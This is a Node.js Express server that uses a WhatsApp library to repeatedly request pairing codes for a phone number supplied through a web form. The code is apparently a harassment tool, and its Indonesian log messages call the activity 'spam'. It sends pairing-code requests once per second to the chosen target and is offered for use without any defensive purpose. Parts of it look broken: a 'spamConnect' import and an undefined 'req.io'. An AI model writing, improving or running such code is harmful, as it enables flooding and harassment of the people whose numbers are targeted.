const pino = require('pino');
const fs = require('fs');
const chalk = require('chalk');
const path = require('path');
const express = require('express');
const { fetchLatestBaileysVersion, useMultiFileAuthState, makeCacheableSignalKeyStore, Browsers, spamConnect, makeInMemoryStore } = require('@whiskeysockets/baileys');
const NodeCache = require('node-cache');

const app = express();
const port = process.env.PORT || 3000;

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

let spam;
let interval;

app.use(express.static('public'));
app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/start', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) return res.status(400).json({ error: 'Nomor telepon tidak diberikan' });

    try {
        const { version } = await fetchLatestBaileysVersion();
        const { state, saveCreds } = await useMultiFileAuthState('./targetsessi');
        const msgRetryCounterCache = new NodeCache();

        spam = spamConnect({
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            browser: Browsers.windows('Firefox'),
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }).child({ level: 'fatal' }))
            },
            markOnlineOnConnect: true,
            msgRetryCounterCache: msgRetryCounterCache,
            generateHighQualityLinkPreview: true,
            getMessage: async key => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id);
                    return msg.message || undefined;
                }
                return { conversation: 'SPAM PAIRING CODE' };
            }
        });

        store.bind(spam.ev);

        if (!spam.authState.creds.registered) {
            let second = 5;
            interval = setInterval(async () => {
                let code = await spam.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join('-') || code;
                console.log(chalk.bgBlack(chalk.greenBright('Pairing Code: ' + code)));
                console.log(chalk.bgBlack(chalk.whiteBright('Spam Berjalan Selama: ' + second + ' detik...')));
                req.io.emit('progress', { second, code });
                if (second <= 0) {
                    clearInterval(interval);
                    console.log(chalk.bgBlack(chalk.redBright('Spam Berhenti')));
                    res.status(200).json({ message: 'Spam selesai' });
                }
                second--;
            }, 1000);
        }
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/stop', (req, res) => {
    if (interval) {
        clearInterval(interval);
        interval = null;
        res.status(200).json({ message: 'Spam stopped' });
    } else {
        res.status(400).json({ error: 'Spam not running' });
    }
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
